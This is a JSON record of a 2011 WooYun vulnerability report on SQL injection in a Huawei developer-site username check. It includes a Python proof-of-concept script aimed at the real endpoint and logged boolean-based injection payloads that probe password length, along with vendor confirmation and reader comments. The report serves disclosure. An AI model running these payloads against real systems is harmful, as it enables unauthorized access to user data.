{"id": 22252, "wybug_id": "wooyun-2011-02682", "wybug_title": "华为智慧云存在SQL注入", "wybug_corp": "华为技术有限公司", "wybug_author": "Matrix", "wybug_date": "2011-08-18 08:45", "wybug_open_date": "2011-09-17 08:46", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "用户敏感数据泄漏", "注射黑盒测试技巧", "注射黑盒漏洞测试", "黑盒分析技巧", "注射上线文敏感"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-09-17：\t细节向公众公开  简要描述： 华为智慧云存在SQL注入，理论上可修改后台数据 详细说明：  http://developer.huaweidevice.com/dev_creg.php用户名验证POST数据不严格，提交地址 /dev_creg/preg.php?ckuser=1参考如下测试脚本：\nimport httplib, urllibimport sysif len(sys.argv) < 2:    exit(0)headers = {    \"Accept\": \"*/*\",    \"Accept-Language\": \"zh-CN,zh;q=0.8\",    \"Referer\": \"http://developer.huaweidevice.com/dev_creg.php\",    \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\",    \"Content-Type\": \"application/x-www-form-urlencoded\",    \"X-Requested-With\": \"XMLHttpRequest\",    }params=urllib.urlencode({    \"username\": sys.argv[1],})conn = httplib.HTTPConnection('developer.huaweidevice.com')conn.request(\"POST\", \"/dev_creg/preg.php?ckuser=1\", params, headers)response = conn.getresponse()data = response.read()try:    print data.decode(\"utf-8\")except Exception:    print dat\n   漏洞证明：  test.py \".a'\"返回错误信息：<b>SQL</b>: select uid  from [Table]members  where username='.a'' <br />D:\\>test.py \".a'or'1'='1\"{\"code\":0,\"msg\":\"昵称不合法或者已存在\"}后台有简单过滤遇到空格会截断。D:\\>test.py \".a'or(length(password)=32)or'2'='1\"{\"code\":0,\"msg\":\"昵称不合法或者已存在\"}D:\\>test.py \".a'or(length(password)=31)or'2'='1\"{\"code\":1,\"msg\":\"恭喜该名字可以注册!\"}D:\\>test.py \".a'or(length(password)=33)or'2'='1\"{\"code\":1,\"msg\":\"恭喜该名字可以注册!\"}   修复方案：  建议做SQL过滤   版权声明：转载请注明来源 Matrix@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2011-08-18 14:01 厂商回复： 感谢业界对华为信息安全的关注，我们将尽快修复漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-08-18 19:30 |    \t\tw0lfram \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | 流氓无罪，文化可耻。)\t\t \n  求具体    \n     2011-08-18 19:38 |    \t\tMatrix \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:5        | NOD)\t\t \n  测试的Python代码已经很具体了吧，因为没有后台代码，只能查不到解释道如此了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}